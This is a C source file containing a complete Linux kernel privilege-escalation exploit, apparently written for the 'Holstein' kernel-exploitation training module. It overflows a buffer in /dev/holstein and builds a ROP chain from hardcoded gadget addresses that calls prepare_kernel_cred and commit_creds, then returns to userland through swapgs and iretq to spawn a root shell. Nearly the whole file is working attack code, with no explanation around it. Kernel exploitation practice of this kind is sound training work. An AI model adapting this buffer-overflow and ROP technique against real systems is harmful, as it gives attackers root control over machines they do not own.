#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdint.h>


int global_fd;


unsigned long user_cs, user_ss, user_rflags, user_sp;

uint64_t prepare_kernel_cred = 0xffffffff8106e240;
uint64_t commit_creds = 0xffffffff8106e390;
uint64_t pop_rdi = 0xffffffff8127bbdc;
uint64_t mov_rdi_rep_ret = 0xffffffff8160c96b;
uint64_t swapgs_ret = 0xffffffff8160bf7e;
uint64_t iretq_ = 0xffffffff810202af;
uint64_t pop_rcx = 0xffffffff812ea083;

void open_dev() {

	global_fd = open("/dev/holstein", O_RDWR);
	if (global_fd < 0) {
		puts("[!] Failed to open FD.\n");
		exit(-1);
	} else {
		puts("[*] Opened device! :)\n");
	}
}


static void save_state() {
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_rflags)
      :
      : "memory");
}

static void win() {
  char *argv[] = { "/bin/sh", NULL };
  char *envp[] = { NULL };
  puts("[+] win!");
  execve("/bin/sh", argv, envp);
}


//    0xffffffffc000020d c9                      <NO_SYMBOL>   leave   
//    0xffffffffc000020e c3                      <NO_SYMBOL>   ret     

// 0xffffffff81021cf9 : push rax ; ret                                                                                                                                                    
// 0xffffffff8127bbdc : pop rdi ; ret


// vuln 16384 0 - Live 0xffffffffc0000000 (O)
// +190

// ffffffff8106e240 T prepare_kernel_cred
// ffffffff8106e390 T commit_creds
// 0xffffffff8160bf7e : swapgs ; ret
// 0xffffffff810202af : iretq             
// 0xffffffff8160c96b : mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret               
// 0xffffffff812ea083 : pop rcx ; ret                                                                                                 


void overwrite() {


	char payload[0x600];
	memset(payload, 'A', 0x408);

  unsigned long *chain = (unsigned long*)&payload[0x408];
  *chain++ = pop_rdi;
  *chain++ = 0;
  *chain++ = prepare_kernel_cred;
  *chain++ = pop_rcx;
  *chain++ = 0;
  *chain++ = mov_rdi_rep_ret;
  *chain++ = commit_creds;
  *chain++ = swapgs_ret;
  *chain++ = iretq_;
  *chain++ = (unsigned long)&win;
  *chain++ = user_cs;
  *chain++ = user_rflags;
  *chain++ = user_sp;
  *chain++ = user_ss;

	ssize_t w = write(global_fd, payload, (void*)chain - (void*)payload);
	puts("[*] Se debería haber escrito esto por ahí! :s");
}

int main() {

	save_state();
	open_dev();
	overwrite();
	puts("[!] Should never be reached!");

	return 0;

}
